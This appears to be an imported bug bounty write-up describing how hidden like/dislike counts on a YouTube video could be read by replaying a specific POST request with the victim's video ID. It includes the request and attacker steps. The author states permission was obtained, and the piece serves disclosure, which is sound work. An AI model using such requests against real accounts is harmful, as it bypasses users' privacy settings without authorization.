---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-06-14_how-i-was-able-to-see-likes-and-dislikes-count-which-is-hidden-by-victim-youtube.md
original_filename: 2022-06-14_how-i-was-able-to-see-likes-and-dislikes-count-which-is-hidden-by-victim-youtube.md
title: 'How I was able to see likes and dislikes count which is hidden by victim |
  YouTube #1'
category: documents
detected_topics:
- access-control
- command-injection
- business-logic
tags:
- imported
- documents
- access-control
- command-injection
- business-logic
language: en
raw_sha256: 53ecf1347c0e26f55e8951c4bb759d4ee09998efaf2aa56b67aad73416b61e1b
text_sha256: 5c186bd1514a71d15679b024a70579c67d3c8c9ebcbd044f022168f8bb890535
ingested_at: '2026-06-28T07:32:12Z'
sensitivity: unknown
redactions_applied: false
---

# How I was able to see likes and dislikes count which is hidden by victim | YouTube #1

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-06-14_how-i-was-able-to-see-likes-and-dislikes-count-which-is-hidden-by-victim-youtube.md
- Source Type: markdown
- Detected Topics: access-control, command-injection, business-logic
- Ingested At: 2026-06-28T07:32:12Z
- Redactions Applied: False
- Raw SHA256: `53ecf1347c0e26f55e8951c4bb759d4ee09998efaf2aa56b67aad73416b61e1b`
- Text SHA256: `5c186bd1514a71d15679b024a70579c67d3c8c9ebcbd044f022168f8bb890535`


## Content

---
title: "How I was able to see likes and dislikes count which is hidden by victim | YouTube #1"
url: "https://medium.com/@janijay007/how-i-was-able-to-see-likes-and-dislikes-count-which-is-hidden-by-victim-youtube-1-fa9cfe7cce7d"
authors: ["Jay Jani (@JayJani007)"]
programs: ["Google"]
bugs: ["Logic flaw", "Broken authorization"]
publication_date: "2022-06-14"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2560
scraped_via: "browseros"
---

# How I was able to see likes and dislikes count which is hidden by victim | YouTube #1

How I was able to see likes and dislikes count which is hidden by victim | YouTube #1
Jay Jani
Follow
1 min read
·
Jun 14, 2022

54

Hello friends, long time no see 😂

I had a long break from bug bounty so I am writing this post after a long time. Today I am going to write about one of my recent finding on Google. Let’s get started.

Introduction:
YouTube allows you to hide like/dislike count when you upload any video. This feature had multiple bugs which were submitted by Rando.

PS: I have taken permission to exploit this bug against Rando’s video to confirm the bug. Please do not blindly exploit against anyone’s video if you are able to find bypass of this.

Exploitation:

Get Jay Jani’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Victim:
1. Upload video
2. Edit video
3. Disable like count on video
4. Save

Attacker:
1. Visit this POST request

POST /youtubei/v1/reel/reel_item_watch HTTP/1.1
Host: m.youtube.com

{"context":......{"playerRequest":{"videoId":"zlcKT3ZzWyk"},"params":"CA8gACoAMAI%3D","disablePlayerResponse":true}}

2. Change the original video id to victim’s video id
3. Attacker is able to see like/dislike count.

PoC video: https://www.youtube.com/watch?v=8SmMttR9NyY
